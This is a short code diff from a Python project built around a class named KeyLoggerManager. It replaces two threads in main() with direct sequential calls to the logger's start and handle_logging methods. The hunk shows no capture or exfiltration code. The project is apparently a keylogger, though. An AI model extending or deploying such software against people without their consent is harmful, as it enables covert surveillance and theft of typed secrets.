@@ -36,10 +36,8 @@ class KeyLoggerManager:
 
 def main():
     key_logger = KeyLoggerManager()
-    thread1 = threading.Thread(target=key_logger.start)
-    thread2 = threading.Thread(target=key_logger.handle_logging)
-    thread1.start()
-    thread2.start()
+    key_logger.start()
+    key_logger.handle_logging()
 
 
 if __name__ == "__main__":
